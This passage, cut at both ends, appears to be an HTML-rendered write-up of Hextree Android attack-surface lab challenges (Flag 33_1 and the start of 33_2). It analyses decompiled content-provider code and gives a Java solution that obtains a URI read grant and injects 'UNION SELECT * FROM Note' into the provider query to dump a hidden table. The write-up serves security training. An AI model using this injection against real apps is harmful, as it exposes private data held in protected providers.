</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToNext</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h3 class="relative group">Flag 33_1<div id=flag-33_1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-33_1 aria-label=Anchor>#</a></span></h3><h4 class="relative group">Code analysis<div id=code-analysis-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code-analysis-3 aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;provider</span>
</span></span><span class=line><span class=cl>            <span class=na>android:name=</span><span class=s>&#34;io.hextree.attacksurface.providers.Flag33Provider1&#34;</span>
</span></span><span class=line><span class=cl>            <span class=na>android:enabled=</span><span class=s>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>            <span class=na>android:exported=</span><span class=s>&#34;false&#34;</span>
</span></span><span class=line><span class=cl>            <span class=na>android:authorities=</span><span class=s>&#34;io.hextree.flag33_1&#34;</span>
</span></span><span class=line><span class=cl>            <span class=na>android:grantUriPermissions=</span><span class=s>&#34;true&#34;</span><span class=nt>/&gt;</span>
</span></span></code></pre></div><p>here we cant query it directly but we are granted URI permission which <strong>temporary grants permission</strong> for specific URIs, even if the caller doesn’t normally have access.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>prepareDB</span><span class=p>(</span><span class=n>LogHelper</span><span class=w> </span><span class=n>logHelper</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ContentValues</span><span class=w> </span><span class=n>contentValues</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ContentValues</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>contentValues</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>FlagDatabaseHelper</span><span class=p>.</span><span class=na>COLUMN_CONTENT</span><span class=p>,</span><span class=w> </span><span class=n>logHelper</span><span class=p>.</span><span class=na>appendLog</span><span class=p>(</span><span class=n>Flag33Activity1</span><span class=p>.</span><span class=na>FLAG</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>dbHelper</span><span class=p>.</span><span class=na>getReadableDatabase</span><span class=p>().</span><span class=na>update</span><span class=p>(</span><span class=n>FlagDatabaseHelper</span><span class=p>.</span><span class=na>TABLE_NOTE</span><span class=p>,</span><span class=w> </span><span class=n>contentValues</span><span class=p>,</span><span class=w> </span><span class=s>&#34;title=?&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;flag33&#34;</span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>containsFlag33</span><span class=p>(</span><span class=n>Cursor</span><span class=w> </span><span class=n>cursor</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>boolean</span><span class=w> </span><span class=n>z</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToNext</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=kc>true</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnCount</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=s>&#34;flag33&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=n>i</span><span class=p>)))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>z</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>i</span><span class=o>++</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>z</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>The <code>prepareDB()</code> takes the real flag (from <code>Flag33Activity1</code>) and updates the Note table&rsquo;s <code>flag33 </code>entry with it But keeps the Note table officially &ldquo;closed&rdquo; to queries?! And the <code>containsFlag33</code> Looks through all of data returned If it spots &ldquo;flag33&rdquo; anywhere, it returns true</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>AUTHORITY</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;io.hextree.flag33_1&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>FLAGS</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>NOTES</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>UriMatcher</span><span class=w> </span><span class=n>uriMatcher2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UriMatcher</span><span class=p>(</span><span class=o>-</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>uriMatcher</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uriMatcher2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>uriMatcher2</span><span class=p>.</span><span class=na>addURI</span><span class=p>(</span><span class=n>AUTHORITY</span><span class=p>,</span><span class=w> </span><span class=s>&#34;flags&#34;</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>uriMatcher2</span><span class=p>.</span><span class=na>addURI</span><span class=p>(</span><span class=n>AUTHORITY</span><span class=p>,</span><span class=w> </span><span class=s>&#34;notes&#34;</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// android.content.ContentProvider</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Cursor</span><span class=w> </span><span class=nf>query</span><span class=p>(</span><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>strArr</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>strArr2</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>append</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>(</span><span class=s>&#34;Flag33Provider1.query(&#39;&#34;</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>getPath</span><span class=p>()).</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;&#39;): &#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>UriMatcher</span><span class=w> </span><span class=n>uriMatcher2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uriMatcher</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;Flag33Provider1&#34;</span><span class=p>,</span><span class=w> </span><span class=n>append</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>uriMatcher2</span><span class=p>.</span><span class=na>match</span><span class=p>(</span><span class=n>uri</span><span class=p>)).</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SQLiteDatabase</span><span class=w> </span><span class=n>readableDatabase</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>dbHelper</span><span class=p>.</span><span class=na>getReadableDatabase</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>match</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uriMatcher2</span><span class=p>.</span><span class=na>match</span><span class=p>(</span><span class=n>uri</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>match</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>match</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>IllegalArgumentException</span><span class=p>(</span><span class=s>&#34;access to Notes table not yet implemented&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>IllegalArgumentException</span><span class=p>(</span><span class=s>&#34;Unknown URI: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>uri</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>prepareDB</span><span class=p>(</span><span class=n>logHelper</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Cursor</span><span class=w> </span><span class=n>query</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>readableDatabase</span><span class=p>.</span><span class=na>query</span><span class=p>(</span><span class=n>FlagDatabaseHelper</span><span class=p>.</span><span class=na>TABLE_FLAG</span><span class=p>,</span><span class=w> </span><span class=n>strArr</span><span class=p>,</span><span class=w> </span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=n>strArr2</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>str2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>containsFlag33</span><span class=p>(</span><span class=n>query</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>success</span><span class=p>(</span><span class=n>logHelper</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>       
</span></span></span></code></pre></div><p>now we have 2 routes we can go in</p><ul><li>If you ask for &ldquo;flags&rdquo; (path <code>/flags</code>), you get sent to flags table and see its content</li><li>If you ask for &ldquo;notes&rdquo; (path <code>/notes</code>), you get sent to section 2 (but it&rsquo;s closed and not officially accessible )</li></ul><p>Then the rest of the code It checks what you&rsquo;re asking for (only &ldquo;flags&rdquo;) aka (match !=1) then Calls <code>prepareDB()</code> (which as explained up) prepare the notes table and Runs your query on the Flag table If it finds &ldquo;flag33&rdquo; in results, triggers <code>success</code></p><p>now how to talk to it ? using activity 31_1</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>       </span><span class=n>Intent</span><span class=w> </span><span class=n>intent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getIntent</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>stringExtra</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>intent</span><span class=p>.</span><span class=na>getStringExtra</span><span class=p>(</span><span class=s>&#34;secret&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>stringExtra</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>intent</span><span class=p>.</span><span class=na>getAction</span><span class=p>()</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=o>!</span><span class=n>intent</span><span class=p>.</span><span class=na>getAction</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;io.hextree.FLAG33&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>intent</span><span class=p>.</span><span class=na>setData</span><span class=p>(</span><span class=n>Uri</span><span class=p>.</span><span class=na>parse</span><span class=p>(</span><span class=s>&#34;content://io.hextree.flag33_1/flags&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>intent</span><span class=p>.</span><span class=na>addFlags</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>setResult</span><span class=p>(</span><span class=o>-</span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>intent</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>finish</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>Flag33Provider1</span><span class=p>.</span><span class=na>secret</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>stringExtra</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LogHelper</span><span class=p>(</span><span class=k>this</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>f</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=s>&#34;access-notes-table&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>f</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=s>&#34;flag33&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>checkStatus</span><span class=p>(</span><span class=k>this</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>It receives an intent and if it has action <code>"io.hextree.FLAG33"</code> and extra string is null it sets the Uri with <code>"content://io.hextree.flag33_1/flags"</code> and flag 1 which is <code>FLAG_GRANT_READ_URI_PERMISSION</code></p><h4 class="relative group">Solution<div id=solution-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-3 aria-label=Anchor>#</a></span></h4><p>so what we can do? we can send an intent with <code>startActivityForResult</code> and using SQLi injection but this time it&rsquo;s called union attack because we want to access other tables from the db, then use our cursor to get out data and log it</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Intent</span><span class=w> </span><span class=n>intent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>(</span><span class=s>&#34;io.hextree.FLAG33&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>intent</span><span class=p>.</span><span class=na>setComponent</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ComponentName</span><span class=p>(</span><span class=s>&#34;io.hextree.attacksurface&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;io.hextree.attacksurface.activities.Flag33Activity1&#34;</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>startActivityForResult</span><span class=p>(</span><span class=n>intent</span><span class=p>,</span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@Override</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>protected</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onActivityResult</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>requestCode</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>resultCode</span><span class=p>,</span><span class=w> </span><span class=n>Intent</span><span class=w> </span><span class=n>data</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>super</span><span class=p>.</span><span class=na>onActivityResult</span><span class=p>(</span><span class=n>requestCode</span><span class=p>,</span><span class=w> </span><span class=n>resultCode</span><span class=p>,</span><span class=w> </span><span class=n>data</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>requestCode</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;flags&#34;</span><span class=p>,</span><span class=w> </span><span class=n>data</span><span class=p>.</span><span class=na>getData</span><span class=p>().</span><span class=na>toString</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>//   where _id=2 union Select  </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Cursor</span><span class=w> </span><span class=n>cursor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>query</span><span class=p>(</span><span class=n>data</span><span class=p>.</span><span class=na>getData</span><span class=p>(),</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;value&#34;</span><span class=p>,</span><span class=s>&#34;visible&#34;</span><span class=p>},</span><span class=w> </span><span class=s>&#34;_id = 2 UNION SELECT  * FROM Note&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToFirst</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>do</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>sb</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnCount</span><span class=p>();</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sb</span><span class=p>.</span><span class=na>length</span><span class=p>()</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;, &#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnName</span><span class=p>(</span><span class=n>i</span><span class=p>)).</span><span class=na>append</span><span class=p>(</span><span class=s>&#34; = &#34;</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=n>i</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;evil&#34;</span><span class=p>,</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToNext</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h3 class="relative group">Flag 33_2<div id=flag-33_2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-33_2 aria-label=Anchor>#</a></span></h3><h4 class="relative group">Code analysis<div id=code-analysis-4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code-analysis-4 aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;provider</span>
</span></span><span class=line><span class=cl>    <span class=na>android:name=</span><span class=s>&#34;io.hextree.attacksurface.providers.Flag33Provider2&#34;</span>
</span></span><span class=line><span class=cl>	<span class=na>android:enabled=</span><span class=s>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>	<span class=na>android:exported=</span><span class=s>&#34;false&#34;</span>
</span></span><span class=line><span class=cl>	<span class=na>android:authorities=</span><span class=s>&#34;io.hextree.flag33_2&#34;</span>
</span></span><span class=line><span class=cl>	    <span class=na>android:grantUriPermissions=</span><span class=s>&#34;true&#34;</span><span class=nt>/&gt;</span>
</span></span></code></pre></div><p>Like the previous flag we cant access it but another component with the right requests it can access it and looking at activity33_2 it has the right requirements</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>stringExtra</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getIntent</span><span class=p>().</span><span class=na>getStringExtra</span><span class=p>(</span><span class=s>&#34;secret&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>stringExtra</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	    </span><span class=n>Intent</span><span class=w> </span><span class=n>intent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	    </span><span class=n>intent</span><span class=p>.</span><span class=na>setAction</span><span class=p>(</span><span class=s>&#34;io.hextree.FLAG33&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	    </span><span class=n>intent</span><span class=p>.</span><span class=na>setData</span><span class=p>(</span><span class=n>Uri</span><span class=p>.</span><span class=na>parse</span><span class=p>(</span><span class=s>&#34;content://io.hextree.flag33_2/flags&#34;</span><span class=p>));</span><span class=w>
